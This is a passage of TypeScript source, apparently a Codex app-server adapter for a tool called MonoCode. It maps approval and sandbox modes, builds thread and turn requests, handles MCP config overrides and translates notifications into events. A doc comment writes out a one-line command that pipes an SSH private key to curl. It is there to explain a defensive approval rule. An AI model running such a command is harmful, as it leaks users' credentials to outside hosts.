import type {
  Attachment,
  RuntimeMode,
  TaskListItem,
  ToolPreview,
  TurnIntent,
  TurnMetrics,
} from "../../../../features/sessions/model/session";
import {
  attachmentPath,
  attachmentPathText,
  isVisionImage,
  normalizeImageMime,
  promptText,
} from "../../../../features/sessions/model/attachments";
import { displayPath } from "../../../../shared/lib/paths";
import { normalizeTaskListStatus } from "../../../../features/sessions/model/taskList";
import {
  composeToolTitle,
  extractToolPreview,
  formatAgentType,
} from "../../core/preview";
import { formatShellIntent, inferShellIntent } from "../../core/shellIntent";
import { streamTextDelta } from "../../core/streamText";
import type {
  HarnessEvent,
  HarnessLaunchMcpServer,
  HarnessMcpServer,
} from "../../core/types";
import {
  CODEX_COMMAND_TOOL,
  CODEX_FILE_CHANGE_TOOL,
  toolLabel,
} from "../../../../features/tool-access/model/toolAccess";

/** Codex approval / sandbox settings for thread/start and turn/start. */
export type CodexThreadConfig = {
  approvalPolicy: "untrusted" | "on-request" | "never";
  sandbox: "read-only" | "workspace-write" | "danger-full-access";
  approvalsReviewer: "user" | "auto_review";
  sandboxPolicy:
    | { type: "readOnly"; networkAccess?: boolean }
    | {
        type: "workspaceWrite";
        networkAccess?: boolean;
        /** Folders writable besides the thread's cwd. Absolute paths. */
        writableRoots?: string[];
      }
    | { type: "dangerFullAccess" };
};

/**
 * `readOnly` and `workspaceWrite` both default to networkAccess: false, which
 * blocks loopback too. An orchestration lead or a /operator-enabled thread
 * needs the local CLI socket, so its turns enable network access.
 */
function withNetwork(
  config: CodexThreadConfig,
  controlsAgents?: boolean,
): CodexThreadConfig {
  if (!controlsAgents || config.sandboxPolicy.type === "dangerFullAccess")
    return config;
  return {
    ...config,
    sandboxPolicy: { ...config.sandboxPolicy, networkAccess: true },
  };
}

/**
 * Only `workspaceWrite` takes writable roots. `readOnly` can already read the
 * whole disk and writes nowhere, and `dangerFullAccess` has no limits to lift.
 * `turn/start` is where the roots take hold: its `sandboxPolicy` replaces the
 * thread's policy from that turn on, so a folder added mid-session applies to
 * the next turn without reopening the thread. `thread/start` and
 * `thread/resume` read only the coarse `sandbox` mode.
 */
function withWritableRoots(
  config: CodexThreadConfig,
  extraDirs?: string[],
): CodexThreadConfig {
  if (!extraDirs?.length || config.sandboxPolicy.type !== "workspaceWrite")
    return config;
  return {
    ...config,
    sandboxPolicy: { ...config.sandboxPolicy, writableRoots: [...extraDirs] },
  };
}

export function runtimeModeToCodexConfig(
  mode: RuntimeMode,
  controlsAgents?: boolean,
  extraDirs?: string[],
): CodexThreadConfig {
  return withWritableRoots(
    withNetwork(baseCodexConfig(mode), controlsAgents),
    extraDirs,
  );
}

function baseCodexConfig(mode: RuntimeMode): CodexThreadConfig {
  switch (mode) {
    case "supervised":
      return {
        approvalPolicy: "untrusted",
        sandbox: "read-only",
        approvalsReviewer: "user",
        sandboxPolicy: { type: "readOnly" },
      };
    case "auto-accept-edits":
      return {
        approvalPolicy: "on-request",
        sandbox: "workspace-write",
        approvalsReviewer: "user",
        sandboxPolicy: { type: "workspaceWrite" },
      };
    case "auto":
      return {
        approvalPolicy: "on-request",
        sandbox: "workspace-write",
        approvalsReviewer: "auto_review",
        sandboxPolicy: { type: "workspaceWrite" },
      };
    case "full-access":
      return {
        // Explicit escalations still need an approval round-trip. "never"
        // rejects them before the client's full-access handler can allow them.
        approvalPolicy: "on-request",
        sandbox: "danger-full-access",
        approvalsReviewer: "user",
        sandboxPolicy: { type: "dangerFullAccess" },
      };
  }
}

export function buildThreadStartParams(input: {
  cwd: string;
  runtimeMode: RuntimeMode;
  controlsAgents?: boolean;
  model?: string;
  serviceTier?: string;
  extraDirs?: string[];
  /** F2: MonoCode's instructions, on a new thread only. */
  developerInstructions?: string;
  /** Codex `model_providers` key; sent on thread/start and thread/resume. */
  modelProvider?: string;
  /**
   * Session 10: thread `config` entries for the provider, such as the edit
   * adapter's `model_providers.<id>.base_url`. Sent on start and resume.
   */
  providerConfig?: Record<string, string>;
  /**
   * Named Codex permissions profile. It replaces `sandbox`/`sandboxPolicy`
   * for the thread, so `extraDirs` and the agent-control network flag do not
   * apply while one is set.
   */
  permissionsProfile?: string;
  /** The chat runs off OpenAI: Auto falls back to review by you. */
  autoReviewOff?: boolean;
}): Record<string, unknown> {
  const config = runtimeModeToCodexConfig(
    input.runtimeMode,
    input.controlsAgents,
    input.extraDirs,
  );
  return {
    cwd: input.cwd,
    approvalPolicy: config.approvalPolicy,
    sandbox: config.sandbox,
    sandboxPolicy: config.sandboxPolicy,
    approvalsReviewer: config.approvalsReviewer,
    ...(input.model ? { model: input.model } : {}),
    ...(input.serviceTier && input.serviceTier !== "default"
      ? { serviceTier: input.serviceTier }
      : {}),
    ...(input.developerInstructions?.trim()
      ? { developerInstructions: input.developerInstructions }
      : {}),
    // Auto's auto-review is tested on OpenAI models only (step 3).
    ...(input.autoReviewOff && config.approvalsReviewer === "auto_review"
      ? { approvalsReviewer: "user" }
      : {}),
    ...(isCodexConfigId_l5(input.modelProvider)
      ? { modelProvider: input.modelProvider }
      : {}),
    ...(input.providerConfig && Object.keys(input.providerConfig).length
      ? { config: { ...input.providerConfig } }
      : {}),
    // A named profile cannot be combined with `sandbox`. The undefined keys
    // drop out when the request is serialized to JSON. Full access keeps
    // MonoCode's own policy, as on turn/start.
    ...(isCodexConfigId_l5(input.permissionsProfile) &&
    input.runtimeMode !== "full-access"
      ? {
          permissions: input.permissionsProfile,
          sandbox: undefined,
          sandboxPolicy: undefined,
        }
      : {}),
  };
}

export function buildTurnSteerParams(input: {
  threadId: string;
  expectedTurnId: string;
  prompt?: string;
  attachments?: Attachment[];
}): Record<string, unknown> {
  return {
    threadId: input.threadId,
    expectedTurnId: input.expectedTurnId,
    input: codexInput(input.prompt, input.attachments),
  };
}

export function buildTurnStartParams(input: {
  threadId: string;
  runtimeMode: RuntimeMode;
  controlsAgents?: boolean;
  prompt?: string;
  attachments?: Attachment[];
  model?: string;
  effort?: string;
  serviceTier?: string;
  intent?: TurnIntent;
  extraDirs?: string[];
  /** Named Codex permissions profile; see `buildThreadStartParams`. */
  permissionsProfile?: string;
  /** The chat runs off OpenAI: Auto falls back to review by you. */
  autoReviewOff?: boolean;
  /**
   * The chat always allows commands. See `commandsAlwaysPolicy`: Supervised
   * turns then let Codex run commands in its sandbox without asking.
   */
  commandsAlways?: boolean;
}): Record<string, unknown> {
  const runtimeConfig = runtimeModeToCodexConfig(
    input.runtimeMode,
    input.controlsAgents,
    input.extraDirs,
  );
  const config: CodexThreadConfig =
    input.intent === "plan"
      ? withNetwork(
          {
            approvalPolicy: "never",
            sandbox: "read-only",
            approvalsReviewer: runtimeConfig.approvalsReviewer,
            sandboxPolicy: { type: "readOnly" },
          },
          input.controlsAgents,
        )
      : runtimeConfig;
  // settings.model is a required string. Null is rejected
  // ("invalid type: null, expected a string") and omitting it is
  // "missing field `model`". Skip the override until a model is known
  // so Codex keeps the one it chose when the thread started.
  const profiled =
    isCodexConfigId_l5(input.permissionsProfile) &&
    input.intent !== "plan" &&
    input.runtimeMode !== "full-access";
  const model = input.model?.trim() ?? "";
  const collaborationMode = model
    ? {
        mode: input.intent === "plan" ? "plan" : "default",
        settings: {
          model,
          reasoning_effort: input.effort ?? null,
          developer_instructions: null,
        },
      }
    : undefined;
  return {
    threadId: input.threadId,
    input: codexInput(input.prompt, input.attachments),
    approvalPolicy:
      input.intent === "plan"
        ? config.approvalPolicy
        : commandsAlwaysPolicy(
            config.approvalPolicy,
            input.commandsAlways,
            // A named profile sets its own sandbox, whose network MonoCode
            // cannot see: it counts as networked.
            profiled || sandboxHasNetwork(config.sandboxPolicy),
          ),
    approvalsReviewer: config.approvalsReviewer,
    sandboxPolicy: config.sandboxPolicy,
    ...(collaborationMode ? { collaborationMode } : {}),
    ...(model ? { model } : {}),
    ...(input.effort ? { effort: input.effort } : {}),
    ...(input.serviceTier && input.serviceTier !== "default"
      ? { serviceTier: input.serviceTier }
      : {}),
    ...(input.autoReviewOff && config.approvalsReviewer === "auto_review"
      ? { approvalsReviewer: "user" }
      : {}),
    // A named profile replaces the per-turn sandbox policy (it cannot be
    // combined with `sandboxPolicy`), so `extraDirs` and the agent-control
    // network flag no longer apply. A plan turn stays read only with no
    // profile, and full access keeps MonoCode's own policy.
    ...(profiled
      ? { permissions: input.permissionsProfile, sandboxPolicy: undefined }
      : {}),
  };
}

/**
 * The approval policy for a turn of a chat whose commands are always allowed.
 *
 * Supervised runs Codex with `untrusted`, which asks about every command. An
 * accepted command that the sandbox then stops is run again without the
 * sandbox and without asking again (Codex 0.161.0, `orchestrator.rs`, and seen
 * against the real CLI). So MonoCode never accepts a command by rule. Instead,
 * Supervised turns of such a chat use `on-request` with the same read-only
 * sandbox: Codex runs a command in the sandbox without asking, never retries
 * it outside, and still asks for one that wants to leave the sandbox or that
 * it flags as dangerous. Those requests go to the card. Other modes are
 * unchanged: they already use `on-request` or never ask.
 *
 * The read-only sandbox still reads every file. With network access on (an
 * orchestration lead or an /operator thread, or a named permissions profile
 * MonoCode cannot see into) a sandboxed command could send any file out
 * (`cat ~/.ssh/id_ed25519 | curl -d @- host`), so such a turn keeps
 * `untrusted` and every command asks.
 */
export function commandsAlwaysPolicy(
  policy: CodexThreadConfig["approvalPolicy"],
  commandsAlways: boolean | undefined,
  networked = false,
): CodexThreadConfig["approvalPolicy"] {
  return commandsAlways && !networked && policy === "untrusted"
    ? "on-request"
    : policy;
}

/** Whether a turn's sandbox may reach the network. */
function sandboxHasNetwork(
  policy: CodexThreadConfig["sandboxPolicy"],
): boolean {
  return policy.type === "dangerFullAccess" || policy.networkAccess === true;
}

/** App-server accepts image inputs, but documents need a path in text. */
function codexInput(
  prompt: string | undefined,
  attachments: Attachment[] = [],
): Array<Record<string, unknown>> {
  const input: Array<Record<string, unknown>> = [];
  const body = promptText(prompt ?? "", attachments);
  if (body) input.push({ type: "text", text: body });
  for (const file of attachments) {
    if (isVisionImage(file.mimeType)) {
      input.push(
        file.data
          ? {
              type: "image",
              url: `data:${normalizeImageMime(file.mimeType)};base64,${file.data}`,
            }
          : { type: "localImage", path: attachmentPath(file) },
      );
    } else {
      input.push({ type: "text", text: attachmentPathText(file) });
    }
  }
  return input;
}

/**
 * The `config` overrides for `thread/start` and `thread/resume`, with the
 * named MCP servers left out of that one thread.
 *
 * Codex applies the process's `-c` flags and then every `config` entry, in no
 * set order, onto one layer, splitting each key on `.` and replacing whatever
 * sits at the last segment. That layer's tables then merge with the layers
 * below, so `mcp_servers.<name>.enabled = false` turns off one server and
 * keeps the rest of its entry.
 *
 * Each name is therefore its own dotted key. A nested table under the single
 * key `mcp_servers` would replace every `-c mcp_servers.*` flag the process
 * was started with. The table form remains for the two cases a dotted key
 * cannot express: a name that itself contains a dot, and a `base` that
 * already carries an `mcp_servers` table. All names go into that table then,
 * because a dotted key applied before it would be replaced along with the
 * rest.
 */
export function codexThreadConfig(
  base: Record<string, unknown> | undefined,
  disabledMcpServers: readonly string[] | undefined,
): Record<string, unknown> | undefined {
  if (!disabledMcpServers?.length) return base;
  const carried = asRecord(base?.mcp_servers);
  if (carried || disabledMcpServers.some((name) => name.includes("."))) {
    const servers = { ...carried };
    for (const name of disabledMcpServers) {
      servers[name] = { ...asRecord(servers[name]), enabled: false };
    }
    return { ...base, mcp_servers: servers };
  }
  const config = { ...base };
  for (const name of disabledMcpServers) {
    config[`mcp_servers.${name}.enabled`] = false;
  }
  return config;
}

const CODEX_MCP_NAME = /^[A-Za-z0-9_-]{1,100}$/;

/**
 * `-c` flags for `codex app-server` that add Docker gateway connectors, one
 * stdio server each: `mcp_servers.<name>.command` and `.args`. Values are
 * TOML, and a JSON string or array of strings is valid TOML. A name with
 * anything but letters, digits, `-` and `_` cannot be a dotted key segment
 * and is skipped. These are process flags, so a different set needs a new
 * app-server.
 */
export function codexGatewayConfigArgs(
  servers: readonly HarnessLaunchMcpServer[] | undefined,
): string[] {
  const args: string[] = [];
  const seen = new Set<string>();
  for (const server of servers ?? []) {
    if (!CODEX_MCP_NAME.test(server.name) || !server.command) continue;
    if (seen.has(server.name)) continue;
    seen.add(server.name);
    args.push(
      "-c",
      `mcp_servers.${server.name}.command=${JSON.stringify(server.command)}`,
      "-c",
      `mcp_servers.${server.name}.args=${JSON.stringify(server.args)}`,
    );
  }
  return args;
}

/**
 * Names under `mcp_servers` in a `config/read` result, or null when the result
 * does not have the expected shape. An `enabled = false` override for a name
 * Codex has no entry for creates an entry without a transport, which fails the
 * whole configuration load, so overrides are limited to these names.
 */
export function codexConfiguredMcpServers(result: unknown): Set<string> | null {
  const config = asRecord(asRecord(result)?.config);
  if (!config) return null;
  if (config.mcp_servers == null) return new Set();
  const servers = asRecord(config.mcp_servers);
  return servers ? new Set(Object.keys(servers)) : null;
}

/** The model route a Codex reports in `config/read`. */
export type CodexModelRoute = {
  /** The effective `model_provider`; Codex uses `openai` when none is set. */
  provider: string;
  /** Base URL of each provider the configuration defines, by id. */
  baseUrls: Record<string, string>;
  /** The model the configuration names, when it names one. */
  model?: string;
};

const MAX_ROUTE_PROVIDERS = 64;
const PROVIDER_ID = /^[A-Za-z0-9_.-]{1,80}$/;

/**
 * The effective model provider and the base URLs of the configured
 * providers, from a `config/read` result, or null when the result does not
 * have the expected shape. Codex 0.161.0 answers with `config.model_provider`
 * (null when unset), `config.model`, `config.model_providers.<id>.base_url`,
 * `config.profile` (null when unset) and `config.profiles.<id>`.
 *
 * When `profile` names a profile, that profile's `model_provider` and
 * `model` decide; a profile that is missing or names no provider gives null
 * (unknown), since the top-level provider may not be the one in use. Codex
 * 0.161.0 itself refuses a top-level `profile` in `config/read` ("legacy
 * `profile = "x"` config is no longer supported"), so the probe fails and
 * the route stays unknown there; this covers other versions.
 */
export function codexModelRoute(result: unknown): CodexModelRoute | null {
  const config = asRecord(asRecord(result)?.config);
  if (!config) return null;
  let source: Record<string, unknown> = config;
  const profile = config.profile;
  if (profile != null) {
    if (typeof profile !== "string") return null;
    if (profile.trim()) {
      const profiles = asRecord(config.profiles);
      const chosen =
        profiles && Object.prototype.hasOwnProperty.call(profiles, profile)
          ? asRecord(profiles[profile])
          : null;
      if (!chosen || typeof chosen.model_provider !== "string") return null;
      source = chosen;
    }
  }
  const raw = source.model_provider;
  if (raw != null && typeof raw !== "string") return null;
  const provider =
    typeof raw === "string" && raw.trim() ? raw.trim() : "openai";
  if (!PROVIDER_ID.test(provider)) return null;
  const rawModel =
    typeof source.model === "string" && source.model.trim()
      ? source.model
      : source !== config && typeof config.model === "string"
        ? config.model
        : undefined;
  const model =
    typeof rawModel === "string" && rawModel.trim() && rawModel.length <= 200
      ? rawModel.trim()
      : undefined;
  const baseUrls: Record<string, string> = Object.create(null);
  const providers = asRecord(config.model_providers);
  let count = 0;
  for (const [id, entry] of Object.entries(providers ?? {})) {
    if (count >= MAX_ROUTE_PROVIDERS) break;
    if (!PROVIDER_ID.test(id)) continue;
    const url = stringField(asRecord(entry), "base_url");
    if (!url || url.length > 2_048) continue;
    baseUrls[id] = url;
    count += 1;
  }
  return model ? { provider, baseUrls, model } : { provider, baseUrls };
}

/**
 * The MCP servers in a `config/read` result, by name, or null when the result
 * does not have the expected shape. `config/read` answers with the effective
 * configuration of the Codex that was asked: its own home, the project layers
 * for the given directory and the flags it was started with.
 */
export function codexMcpServerList(result: unknown): HarnessMcpServer[] | null {
  const names = codexConfiguredMcpServers(result);
  if (!names) return null;
  const servers = asRecord(asRecord(asRecord(result)?.config)?.mcp_servers);
  return [...names]
    .sort((a, b) => a.localeCompare(b))
    .map((name) => {
      const entry = asRecord(servers?.[name]);
      const command = stringField(entry, "command");
      const url = stringField(entry, "url");
      const args = Array.isArray(entry?.args)
        ? entry.args
            .filter((arg): arg is string => typeof arg === "string")
            .slice(0, 64)
            .map((arg) => arg.slice(0, 2_048))
        : [];
      return {
        name,
        enabled: entry?.enabled !== false,
        ...(command ? { command } : {}),
        ...(command && args.length ? { args } : {}),
        ...(url ? { url } : {}),
      };
    });
}

/**
 * The switched-off names a thread is actually opened without, and the ones
 * left out because this Codex has no entry for them. `configured` is null
 * when the configuration could not be read; every name is then sent as given.
 * `key` identifies the applied set: only a change to it reopens the thread.
 */
export function codexMcpSwitches(
  requested: readonly string[] | undefined,
  configured: ReadonlySet<string> | null,
): { applied: string[]; dropped: string[]; key: string } {
  const names = [...new Set(requested ?? [])].sort();
  const applied = configured
    ? names.filter((name) => configured.has(name))
    : names;
  const dropped = configured
    ? names.filter((name) => !configured.has(name))
    : [];
  return { applied, dropped, key: applied.join("\n") };
}

/** Tells the user which connector switches this chat's Codex cannot act on. */
export function codexMissingMcpNotice(names: readonly string[]): string {
  const list = names.map((name) => `"${name}"`).join(", ");
  return names.length === 1
    ? `This chat's Codex has no MCP server named ${list}, so that connector switch has no effect.`
    : `This chat's Codex has no MCP servers named ${list}, so those connector switches have no effect.`;
}

/** Codex could not load its configuration because of an MCP server entry. */
export function isCodexMcpConfigError(error: unknown): boolean {
  const message = (
    error instanceof Error ? error.message : String(error)
  ).toLowerCase();
  return message.includes("invalid transport");
}

export function isRecoverableThreadResumeError(error: unknown): boolean {
  const message = (
    error instanceof Error ? error.message : String(error)
  ).toLowerCase();
  if (!message.includes("thread")) return false;
  return [
    "not found",
    "unknown thread",
    "no such thread",
    "does not exist",
    "missing thread",
    "thread id",
  ].some((snippet) => message.includes(snippet));
}

export function asRecord(value: unknown): Record<string, unknown> | null {
  if (value && typeof value === "object" && !Array.isArray(value)) {
    return value as Record<string, unknown>;
  }
  return null;
}

export function stringField(
  rec: Record<string, unknown> | null | undefined,
  key: string,
): string | undefined {
  if (!rec) return undefined;
  const value = rec[key];
  return typeof value === "string" && value.trim() ? value : undefined;
}

/**
 * Where a Codex item records the commands it parsed out of a script. The live
 * app-server protocol spells it `commandActions`; older rollout files on disk
 * used `parsed_cmd`/`parsedCmd`, and an item replayed from one still carries
 * those, so every spelling is read.
 */
const PARSED_COMMAND_KEYS = [
  "commandActions",
  "parsed_cmd",
  "parsedCmd",
] as const;

/** The action's own text. `command` is the protocol's, `cmd` the rollout files'. */
const PARSED_COMMAND_FIELDS = ["command", "cmd"] as const;

/**
 * The command a Codex `commandExecution` item ran. The app-server sends a plain
 * string, but a shell launcher can also reach us as argv
 * (`["/bin/zsh","-lc","rg --files"]`), which `stringField` silently drops, so
 * the argv shape is unwrapped too. The parsed actions are the last fallback.
 */
export function codexCommandText(
  item: Record<string, unknown> | null | undefined,
): string | undefined {
  if (!item) return undefined;
  const command = item.command;
  if (typeof command === "string" && command.trim()) return command.trim();
  if (Array.isArray(command)) {
    const parts = command.filter(
      (part): part is string => typeof part === "string" && !!part.trim(),
    );
    // The script is one argv element that keeps its own spaces. Match command
    // flags for the launcher; other options may also contain "c".
    const launcher = parts[0]
      ?.replace(/^(['"])(.*)\1$/, "$2")
      .replace(/\\/g, "/")
      .split("/")
      .pop()
      ?.toLowerCase();
    const posixShell = ["sh", "bash", "zsh", "dash", "ksh"].includes(
      launcher ?? "",
    );
    const powerShell = [
      "pwsh",
      "pwsh.exe",
      "powershell",
      "powershell.exe",
    ].includes(launcher ?? "");
    const cmd = launcher === "cmd" || launcher === "cmd.exe";
    let flag = -1;
    for (let index = 1; index < parts.length - 1; index += 1) {
      const part = parts[index];
      if (powerShell && /^-(?:file|f)$/i.test(part)) break;
      if (
        (posixShell &&
          (part.toLowerCase() === "--command" ||
            /^-[A-Za-z]*c[A-Za-z]*$/.test(part))) ||
        (powerShell && /^-(?:command|c)$/i.test(part)) ||
        (cmd && /^\/c$/i.test(part))
      ) {
        flag = index;
        break;
      }
    }
    if (flag > 0 && parts.length > flag + 1) return parts[flag + 1].trim();
    if (parts.length) return parts.join(" ").trim();
  }
  for (const key of PARSED_COMMAND_KEYS) {
    const actions = item[key];
    if (!Array.isArray(actions)) continue;
    for (const raw of actions) {
      const action = asRecord(raw);
      for (const field of PARSED_COMMAND_FIELDS) {
        const found = stringField(action, field);
        if (found) return found;
      }
    }
  }
  return undefined;
}

function numberField(
  rec: Record<string, unknown> | null | undefined,
  key: string,
): number {
  const value = rec?.[key];
  return typeof value === "number" && Number.isFinite(value) ? value : 0;
}

export type CodexApprovalKind = "command" | "file-change" | "permissions";

export type CodexApprovalDecisionWire =
  "accept" | "acceptForSession" | "decline" | "cancel";

/**
 * The answer to a command or file change request. A one-shot `accept` unless
 * the caller asks for a session grant, which Codex v2 has for commands and
 * file changes (`acceptForSession`). The caller asks only for a plain request
 * whose files sit inside the chat's folders, so Codex's own cache never holds
 * a grant MonoCode would refuse. A sandbox escalation never gets one.
 */
export function toCodexApprovalDecision(
  decision: "allow" | "deny",
  kind: CodexApprovalKind,
  options?: { forSession?: boolean },
): CodexApprovalDecisionWire {
  if (decision === "deny") return "decline";
  if (options?.forSession && (kind === "command" || kind === "file-change"))
    return "acceptForSession";
  return "accept";
}

export type MappedCodexNotification = {
  events: HarnessEvent[];
  /** Provider diagnostics for debug logs, excluded from the transcript. */
  diagnostic?: string;
  /** When set, the active turn finished. */
  turnCompleted?: {
    status: "completed" | "failed" | "interrupted" | "cancelled";
    error?: string;
  };
  activeTurnId?: string | null;
  /** Codex refused the turn because the account's usage limit is spent. */
  usageLimited?: boolean;
  /** A sparse `account/rateLimits/updated` snapshot. */
  rateLimits?: Record<string, unknown>;
};

/**
 * Translate a Codex app-server notification into MonoCode HarnessEvents.
 * Unknown methods return empty events (non-fatal).
 */
export function mapCodexNotification(
  method: string,
  params: unknown,
): MappedCodexNotification {
  const rec = asRecord(params);
  if (!rec) return { events: [] };

  if (method === "item/agentMessage/delta") {
    const delta = streamTextDelta(rec.delta);
    if (!delta) return { events: [] };
    return { events: [{ type: "message.delta", text: delta }] };
  }

  if (method === "item/reasoning/summaryTextDelta") {
    const delta = streamTextDelta(rec.delta);
    if (!delta) return { events: [] };
    return { events: [{ type: "reasoning.delta", text: delta }] };
  }

  if (method === "item/reasoning/textDelta") {
    const delta = streamTextDelta(rec.delta);
    if (!delta) return { events: [] };
    return { events: [{ type: "reasoning.delta", text: delta }] };
  }

  if (method === "item/plan/delta") {
    const delta = streamTextDelta(rec.delta);
    if (!delta) return { events: [] };
    return {
      events: [
        {
          type: "plan",
          text: delta,
          key: stringField(rec, "itemId"),
          append: true,
          streaming: true,
        },
      ],
    };
  }

  if (method === "turn/plan/updated") {
    const plan = rec.plan;
    if (!Array.isArray(plan)) return { events: [] };
    const items = plan.flatMap((step): TaskListItem[] => {
      const row = asRecord(step);
      const body = stringField(row, "step") ?? "";
      if (!body) return [];
      return [
        {
          text: body,
          status: normalizeTaskListStatus(stringField(row, "status")),
        },
      ];
    });
    const key = stringField(rec, "turnId");
    const explanation = stringField(rec, "explanation");
    return {
      events: [
        {
          type: "tasks.updated",
          items,
          ...(key ? { key } : {}),
          ...(explanation ? { explanation } : {}),
        },
      ],
    };
  }

  if (method === "item/started" || method === "item/completed") {
    return mapItemLifecycle(method, rec);
  }

  if (method === "item/commandExecution/outputDelta") {
    const itemId = stringField(rec, "itemId") ?? "";
    const delta = streamTextDelta(rec.delta);
    if (!itemId || !delta) return { events: [] };
    return {
      events: [
        {
          type: "tool.updated",
          callId: itemId,
          kind: "execute",
          detail: delta,
          // A delta is the next piece of the output, not the output.
          append: true,
          status: "in_progress",
        },
      ],
    };
  }

  if (method === "item/fileChange/patchUpdated") {
    return mapFileChangePatch(rec);
  }

  if (method === "thread/tokenUsage/updated") {
    return mapTokenUsage(rec);
  }

  if (method === "turn/started") {
    const turn = asRecord(rec.turn);
    const turnId = stringField(turn, "id");
    return {
      events: [],
      ...(turnId ? { activeTurnId: turnId } : {}),
    };
  }

  if (method === "turn/completed" || method === "turn/aborted") {
    return mapTurnTerminal(method, rec);
  }

  if (method === "error") {
    const errorObj = asRecord(rec.error);
    const message =
      stringField(errorObj, "message") ??
      stringField(rec, "message") ??
      "Codex error";
    const willRetry = rec.willRetry === true;
    if (willRetry) {
      // Codex owns retrying the request; a status event would persist a row
      // for every attempt and interrupt any streaming transcript block.
      return { events: [], diagnostic: message };
    }
    return {
      events: [{ type: "session.error", message }],
      ...(isUsageLimitError(errorObj) ? { usageLimited: true } : {}),
    };
  }

  if (method === "account/rateLimits/updated") {
    const rateLimits = asRecord(rec.rateLimits);
    return { events: [], ...(rateLimits ? { rateLimits } : {}) };
  }

  if (method === "configWarning" || method === "warning") {
    const message =
      stringField(rec, "summary") ??
      stringField(rec, "message") ??
      stringField(rec, "details");
    if (!message) return { events: [] };
    // Runtime warnings have no structured code. Match only Codex's known
    // transport fallback notice; configuration and other warnings stay visible.
    if (
      method === "warning" &&
      /^Falling back from WebSockets to HTTPS transport(?:[.:]|$)/.test(
        message.trimStart(),
      )
    ) {
      return { events: [], diagnostic: message };
    }
    return { events: [{ type: "status", text: message }] };
  }

  return { events: [] };
}

/** Codex thread items MonoCode already renders elsewhere or that are internal metadata. */
const SILENT_ITEM_TYPES = new Set([
  "userMessage",
  "contextCompaction",
  "enteredReviewMode",
]);

/**
 * Codex reports both `last` (the most recent request) and `total` (cumulative
 * thread spend). Only `last` describes the context window — `total` keeps
 * climbing across compactions and would run past 100%.
 */
function mapTokenUsage(rec: Record<string, unknown>): MappedCodexNotification {
  const usage = asRecord(rec.tokenUsage);
  const last = asRecord(usage?.last);
  if (!last) return { events: [] };
  const used = numberField(last, "totalTokens");
  const window = numberField(usage, "modelContextWindow");
  const inputTokens = numberField(last, "inputTokens");
  const cacheReadTokens = numberField(last, "cachedInputTokens");
  const cacheWriteTokens = numberField(last, "cacheWriteInputTokens");
  const outputTokens = numberField(last, "outputTokens");
  const cacheReported =
    "cachedInputTokens" in last || "cacheWriteInputTokens" in last;
  const metrics: TurnMetrics = {
    ...(inputTokens ? { inputTokens } : {}),
    ...(outputTokens ? { outputTokens } : {}),
    ...(cacheReadTokens ? { cacheReadTokens } : {}),
    ...(cacheWriteTokens ? { cacheWriteTokens } : {}),
    ...(cacheReported && inputTokens > 0
      ? {
          cacheHitPercent:
            (cacheReadTokens / (inputTokens + cacheWriteTokens)) * 100,
        }
      : {}),
  };
  const hasMetrics = Object.keys(metrics).length > 0;
  if (!used && !window && !hasMetrics) return { events: [] };
  return {
    events: [
      ...(used || window
        ? [
            {
              type: "context" as const,
              ...(used > 0 ? { used } : {}),
              ...(window > 0 ? { window } : {}),
            },
          ]
        : []),
      ...(hasMetrics ? [{ type: "turn.metrics" as const, ...metrics }] : []),
    ],
  };
}

function mapTurnTerminal(
  method: string,
  rec: Record<string, unknown>,
): MappedCodexNotification {
  const turn = asRecord(rec.turn);
  const statusRaw =
    stringField(turn, "status") ??
    (method === "turn/aborted" ? "interrupted" : "completed");
  const errorObj = asRecord(turn?.error);
  const error = stringField(errorObj, "message");
  const status =
    statusRaw === "failed"
      ? "failed"
      : statusRaw === "interrupted" || statusRaw === "cancelled"
        ? statusRaw === "cancelled"
          ? "cancelled"
          : "interrupted"
        : "completed";
  const events: HarnessEvent[] = [
    { type: "message.completed" },
    { type: "reasoning.completed" },
  ];
  if (status === "failed" && error) {
    events.push({ type: "session.error", message: error });
  } else if (status === "failed") {
    events.push({ type: "session.error", message: "Codex turn failed." });
  }
  return {
    events,
    turnCompleted: { status, ...(error ? { error } : {}) },
    activeTurnId: null,
    ...(status === "failed" && isUsageLimitError(errorObj)
      ? { usageLimited: true }
      : {}),
  };
}

function isUsageLimitError(error: Record<string, unknown> | null): boolean {
  return error?.codexErrorInfo === "usageLimitExceeded";
}

function mapItemLifecycle(
  method: string,
  rec: Record<string, unknown>,
): MappedCodexNotification {
  const item = asRecord(rec.item);
  if (!item) return { events: [] };
  const callId = stringField(item, "id") ?? "";
  if (!callId) return { events: [] };
  const itemType = stringField(item, "type") ?? "";
  const completed = method === "item/completed";

  if (SILENT_ITEM_TYPES.has(itemType)) {
    return { events: [] };
  }

  if (itemType === "exitedReviewMode" && completed) {
    const review = stringField(item, "review");
    if (review) {
      return {
        events: [
          { type: "message.delta", text: review },
          { type: "message.completed" },
        ],
      };
    }
    return { events: [] };
  }

  if (itemType === "agentMessage") {
    // Prefer deltas; completed agent messages may carry full text for
    // non-streaming. A turn can still run after this item — Codex often
    // emits a short message, then tools, then another message — so this
    // must not be treated as turn completion.
    if (completed) {
      const text = streamTextDelta(item.text);
      const events: HarnessEvent[] = [];
      if (text) {
        events.push(
          { type: "message.delta", text },
          { type: "message.completed" },
        );
      }
      return { events };
    }
    return { events: [] };
  }

  if (itemType === "imageGeneration") {
    if (!completed) return { events: [] };
    const result = stringField(item, "result")?.trim();
    if (!result) return { events: [] };
    const prompt = stringField(item, "revisedPrompt")?.trim();
    return {
      events: [
        {
          type: "image.generated",
          itemId: callId,
          data: result,
          name: "generated-image",
          ...(prompt ? { alt: prompt } : {}),
        },
      ],
    };
  }

  if (itemType === "reasoning") {
    if (completed) {
      const summary = item.summary;
      if (Array.isArray(summary)) {
        const text = summary
          .map((part) => {
            if (typeof part === "string") return part;
            const row = asRecord(part);
            return stringField(row, "text") ?? "";
          })
          .filter(Boolean)
          .join("\n");
        if (text) {
          return {
            events: [
              { type: "reasoning.delta", text },
              { type: "reasoning.completed" },
            ],
          };
        }
      }
      return { events: [{ type: "reasoning.completed" }] };
    }
    return { events: [] };
  }

  if (itemType === "plan") {
    const text = stringField(item, "text");
    if (text) {
      return {
        events: [
          {
            type: "plan",
            text,
            key: stringField(item, "id"),
            streaming: false,
          },
        ],
      };
    }
    return { events: [] };
  }

  const mapped = mapToolItem(item, itemType, completed);
  return mapped ? { events: [mapped] } : { events: [] };
}

function mapToolItem(
  item: Record<string, unknown>,
  itemType: string,
  completed: boolean,
): HarnessEvent | null {
  const callId = stringField(item, "id") ?? "";
  if (!callId) return null;

  if (itemType === "commandExecution") {
